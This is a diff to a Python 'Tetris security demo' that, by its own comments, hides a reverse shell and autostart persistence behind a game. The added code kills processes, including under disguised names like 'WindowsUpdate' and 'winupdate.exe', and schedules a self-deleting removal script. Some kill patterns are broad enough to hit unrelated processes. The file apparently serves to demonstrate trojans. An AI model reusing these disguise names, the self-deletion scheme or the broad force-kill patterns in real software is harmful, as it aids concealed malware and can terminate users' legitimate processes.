@@ -24,6 +24,8 @@ import time
 import platform
 import shutil
 import json
+import shlex
+import tempfile
 from pathlib import Path
 
 # ============================================
@@ -364,14 +366,214 @@ X-GNOME-Autostart-enabled=true
         print(f"[!] Failed to install persistence: {e}")
         return False
 
-def remove_persistence():
+def get_cleanup_process_patterns():
+    """Return process name and path fragments that identify this game."""
+    current_game_path = get_current_game_path()
+    patterns = {
+        str(current_game_path),
+        current_game_path.name,
+        str(get_script_path()),
+        "tetris-game.py",
+        "tetris_complete.py",
+        "tetris-game.exe",
+        "tetris.exe",
+        "winupdate.exe",
+        "winupdate.py",
+        "launcher.bat",
+        "service.py",
+        "system-audio-service.py",
+        "SystemAudioService",
+        "WindowsUpdate",
+    }
+    return sorted(pattern for pattern in patterns if pattern)
+
+
+def kill_running_processes():
+    """Kill any running tetris processes to stop active reverse shell connections."""
+    print("[*] Stopping running tetris processes...")
+    killed = False
+    current_pid = os.getpid()
+    patterns = get_cleanup_process_patterns()
+    
+    try:
+        if IS_WINDOWS:
+            flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+            ps_patterns = ", ".join("'" + pattern.replace("'", "''") + "'" for pattern in patterns)
+            ps_script = f"""
+$patterns = @({ps_patterns})
+$currentPid = {current_pid}
+Get-CimInstance Win32_Process | ForEach-Object {{
+    if ($_.ProcessId -ne $currentPid) {{
+        $details = @($_.CommandLine, $_.ExecutablePath, $_.Name) -join ' '
+        foreach ($pattern in $patterns) {{
+            if ($details -and $details.ToLower().Contains($pattern.ToLower())) {{
+                Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+                break
+            }}
+        }}
+    }}
+}}
+"""
+            try:
+                result = subprocess.run(
+                    ["powershell", "-NoProfile", "-Command", ps_script],
+                    capture_output=True,
+                    text=True,
+                    timeout=20,
+                    creationflags=flags
+                )
+                killed = result.returncode == 0
+            except Exception:
+                pass
+        else:
+            for pattern in patterns:
+                try:
+                    result = subprocess.run(['pgrep', '-f', pattern],
+                                           capture_output=True, text=True, timeout=5)
+                    if result.stdout:
+                        for pid in result.stdout.strip().split('\n'):
+                            try:
+                                pid_int = int(pid.strip())
+                                if pid_int != current_pid:
+                                    os.kill(pid_int, 9)
+                                    killed = True
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+        
+        if killed:
+            print("[+] Running tetris processes killed")
+        else:
+            print("[*] No running tetris processes found")
+        
+        return killed
+        
+    except Exception as e:
+        print(f"[!] Error killing processes: {e}")
+        return False
+
+
+def get_current_game_path():
+    """Resolve the current game executable or script path."""
+    if getattr(sys, "frozen", False):
+        return Path(sys.executable).resolve()
+    
+    argv_path = Path(sys.argv[0]).expanduser()
+    if argv_path.exists():
+        return argv_path.resolve()
+    
+    return Path(__file__).resolve()
+
+
+def path_is_within(path_to_check, parent_path):
+    """Return True when path_to_check is located inside parent_path."""
+    try:
+        path_to_check.resolve().relative_to(parent_path.resolve())
+        return True
+    except ValueError:
+        return False
+
+
+def get_game_removal_targets():
+    """Collect the files that represent the current game installation."""
+    game_path = get_current_game_path()
+    targets = [game_path]
+    
+    if getattr(sys, "frozen", False):
+        bundled_runtime = game_path.parent / "_internal"
+        if bundled_runtime.exists():
+            targets.append(bundled_runtime)
+    
+    return [target for target in targets if target.exists()]
+
+
+def schedule_deferred_removal(paths, description="game files"):
+    """Delete files after the current process exits."""
+    targets = []
+    seen = set()
+    
+    for raw_path in paths:
+        if not raw_path:
+            continue
+        
+        resolved = Path(raw_path).resolve()
+        key = str(resolved)
+        if key in seen:
+            continue
+        
+        seen.add(key)
+        targets.append(resolved)
+    
+    if not targets:
+        return False
+    
+    targets.sort(key=lambda path: len(str(path)), reverse=True)
+    
+    try:
+        if IS_WINDOWS:
+            cleanup_script = Path(tempfile.gettempdir()) / f"tetris_cleanup_{os.getpid()}_{int(time.time())}.bat"
+            lines = ["@echo off", "setlocal", "timeout /t 3 /nobreak > nul"]
+            
+            for _ in range(2):
+                for target in targets:
+                    command = "rmdir /s /q" if target.is_dir() else "del /f /q"
+                    lines.append(f'{command} "{target}" > nul 2>&1')
+                lines.append("timeout /t 2 /nobreak > nul")
+            
+            lines.append('del "%~f0" > nul 2>&1')
+            cleanup_script.write_text("\n".join(lines), encoding="utf-8")
+            
+            flags = subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+            subprocess.Popen(
+                ["cmd", "/c", str(cleanup_script)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=flags
+            )
+        else:
+            cleanup_script = Path(tempfile.gettempdir()) / f"tetris_cleanup_{os.getpid()}_{int(time.time())}.sh"
+            lines = ["#!/bin/sh", "sleep 2"]
+            
+            for target in targets:
+                rm_command = "rm -rf" if target.is_dir() else "rm -f"
+                lines.append(f"{rm_command} {shlex.quote(str(target))}")
+            
+            lines.append(f"rm -f {shlex.quote(str(cleanup_script))}")
+            cleanup_script.write_text("\n".join(lines), encoding="utf-8")
+            cleanup_script.chmod(0o700)
+            
+            subprocess.Popen(
+                ["/bin/sh", str(cleanup_script)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True
+            )
+        
+        print(f"[+] Scheduled removal of {description}")
+        for target in targets:
+            print(f"    - {target}")
+        return True
+        
+    except Exception as e:
+        print(f"[!] Failed to schedule removal of {description}: {e}")
+        return False
+
+
+def remove_persistence(deferred_paths=None):
     """
     Remove all persistence mechanisms.
     This is called by the cleanup tool.
     """
     print("[*] Removing persistence mechanisms...")
     
+    if deferred_paths is None:
+        deferred_paths = []
+    
+    kill_running_processes()
+    
     try:
+        current_game_path = get_current_game_path()
         script_path = get_script_path()
         info_file = script_path / "persistence_info.json"
         
@@ -406,8 +608,12 @@ def remove_persistence():
             
             # Remove script directory
             if script_path.exists():
-                shutil.rmtree(script_path)
-                print(f"[+] Removed persistence directory")
+                if path_is_within(current_game_path, script_path):
+                    deferred_paths.append(script_path)
+                    print("[*] Persistence directory scheduled for removal after exit")
+                else:
+                    shutil.rmtree(script_path)
+                    print(f"[+] Removed persistence directory")
         
         print("[+] Persistence removed successfully!")
         return True
@@ -968,7 +1174,7 @@ def main():
     parser.add_argument("--background", action="store_true", 
                       help="Run in background mode (persistence)")
     parser.add_argument("--cleanup", action="store_true",
-                      help="Remove all persistence and exit")
+                      help="Remove persistence, delete this game, and exit")
     parser.add_argument("--skip-warning", action="store_true",
                       help="Skip security warning (not recommended)")
     
@@ -979,10 +1185,22 @@ def main():
         print("TETRIS SECURITY DEMO - CLEANUP MODE")
         print("=" * 70)
         print()
-        remove_persistence()
+        deferred_paths = []
+        persistence_removed = remove_persistence(deferred_paths=deferred_paths)
+        game_removed = schedule_deferred_removal(
+            get_game_removal_targets() + deferred_paths,
+            description="the game and deferred persistence files"
+        )
         print()
-        print("[+] Cleanup complete. All persistence removed.")
-        return
+        if persistence_removed and game_removed:
+            print("[+] Cleanup complete. Persistence removed and game deletion scheduled.")
+        elif persistence_removed:
+            print("[!] Persistence removed, but the game could not be deleted automatically.")
+        else:
+            print("[!] Cleanup finished with errors. Some persistence may still remain.")
+        sys.stdout.flush()
+        sys.stderr.flush()
+        os._exit(0)
     
     if args.background:
         # Background mode - only run reverse shell, no GUI
